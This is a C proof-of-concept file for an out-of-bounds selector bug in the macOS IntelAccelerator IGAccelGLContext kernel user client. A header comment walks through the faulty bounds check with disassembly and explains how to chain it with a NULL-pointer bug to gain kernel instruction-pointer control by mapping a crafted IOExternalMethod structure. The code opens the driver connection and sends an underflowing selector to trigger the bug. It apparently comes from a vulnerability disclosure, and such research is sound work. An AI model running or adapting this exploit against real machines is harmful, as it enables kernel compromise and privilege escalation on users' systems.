/*
clang -o ig_gl_bounds ig_gl_bounds.c -framework IOKit

IGAccelGLContext::getTargetAndMethodForIndex doesn't correctly bounds check the selector:

__text:000000000000873A ; IGAccelGLContext::getTargetAndMethodForIndex(IOService **, unsigned int)
__text:000000000000873A                 push    rbp
__text:000000000000873B                 mov     rbp, rsp
__text:000000000000873E                 mov     [rsi], rdi
__text:0000000000008741                 lea     eax, [rdx-106h]    ; rdx is controlled selector index
__text:0000000000008747                 cmp     eax, 100h
__text:000000000000874C                 jnb     short loc_8765     ; pass selectors 0..0x105 && 0x207+ to superclass
__text:000000000000874E                 add     edx, 0FFFFFE00h    ; selectors in the range 0x106..0x206 pass the test,
                                                                   ; this then subtracts 0x200, underflowing any selector
                                                                   ; in the range 0x106..0x1ff
__text:0000000000008754                 lea     rax, [rdx+rdx*2]
__text:0000000000008758                 shl     rax, 4
__text:000000000000875C                 add     rax, [rdi+1098h]   ; underflowed value used as index into array of IOExternalMethods
__text:0000000000008763                 pop     rbp
__text:0000000000008764                 retn

the correct range of selectors is 0x200..0x206, however the selector is only checked to be in the range 0x106..0x206 :-)

Exploitation of this issue depends on the value stored at this+0x1098 (which should point to the static methodDescs array.) I've already reported another bug
where this field can be NULL. Combined with this new bug you get a nice way to exploit that NULL pointer deref without having to be able to map the NULL page:

Since the index will underflow a 32-bit value then be extended to 64-bits and multiplied by 48 you end up with a pointer something like this: 0x0000002fffffdf18
which is a mappable address for a 64-bit process, even one which is sandboxed and has a PAGEZERO segment since it's above 4GB. By crafting a valid IOExternalMethod
struct there you can trivially get kernel RIP control.

Once the NULL methodDescs bug is fixed, exploitability of this bug will depend on what data happens to be in the oob region and whether it could be interpreted
as a valid IOExternalMethod structure. (I haven't tried to exploit this approach yet, but the methodDescs array is near various vtables and other
IOExternalMethod arrays so I wouldn't rule it out.)

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(int argc, char** argv){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0;
  }

  io_service_t service = IOIteratorNext(iterator);
  
  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 1, &conn); // type 1 == IGAccelGLContext
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0;
  }

  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  inputScalarCnt = 0;
  inputStructCnt = 0;

  outputScalarCnt = 0;
  outputStructCnt = 0;

  err = IOConnectCallMethod(
   conn,
   0x150, // any value x: 0x106 <= x <= 0x1ff will underflow
   inputScalar,
   inputScalarCnt,
   inputStruct,
   inputStructCnt,
   outputScalar,
   &outputScalarCnt,
   outputStruct,
   &outputStructCnt); 

  if (err != KERN_SUCCESS){
   printf("IOConnectCall error: %x\n", err);
   return 0;
  }
}
